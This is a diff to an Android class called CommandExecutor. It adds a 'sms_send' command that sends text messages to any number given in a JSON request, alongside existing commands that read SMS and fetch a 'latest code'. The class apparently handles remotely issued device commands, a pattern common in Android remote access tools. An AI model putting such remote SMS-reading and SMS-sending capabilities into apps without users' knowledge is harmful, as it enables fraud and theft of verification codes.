@@ -55,6 +55,7 @@ import android.provider.Settings;
 import android.provider.Telephony;
 import android.speech.tts.TextToSpeech;
 import android.telephony.SignalStrength;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.DisplayMetrics;
@@ -362,6 +363,9 @@ public final class CommandExecutor {
             }
             case "sms":
                 readSms(ctx, req, resp);
+                break;
+            case "sms_send":
+                sendSms(ctx, req, resp);
                 break;
             case "latest_code":
                 latestCode(ctx, resp);
@@ -2425,6 +2429,37 @@ public final class CommandExecutor {
             resp.put("error", String.valueOf(t));
         } finally {
             if (c != null) try { c.close(); } catch (Throwable ignored) {}
+        }
+    }
+
+    private static void sendSms(Context ctx, JSONObject req, JSONObject resp) {
+        try {
+            if (ctx.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
+                resp.put("ok", false);
+                resp.put("error", "SEND_SMS permission not granted");
+                return;
+            }
+            String to = req.optString("to", "");
+            if (to.isEmpty()) {
+                resp.put("ok", false);
+                resp.put("error", "to number required");
+                return;
+            }
+            String text = req.optString("text", req.optString("body", ""));
+            if (text.isEmpty()) {
+                resp.put("ok", false);
+                resp.put("error", "text required");
+                return;
+            }
+            SmsManager smsManager = SmsManager.getDefault();
+            ArrayList<String> parts = smsManager.divideMessage(text);
+            smsManager.sendMultipartTextMessage(to, null, parts, null, null);
+            resp.put("ok", true);
+            resp.put("to", to);
+            resp.put("parts", parts.size());
+            resp.put("sent", true);
+        } catch (Throwable t) {
+            try { resp.put("ok", false); resp.put("error", String.valueOf(t)); } catch (Exception ignored) {}
         }
     }
 
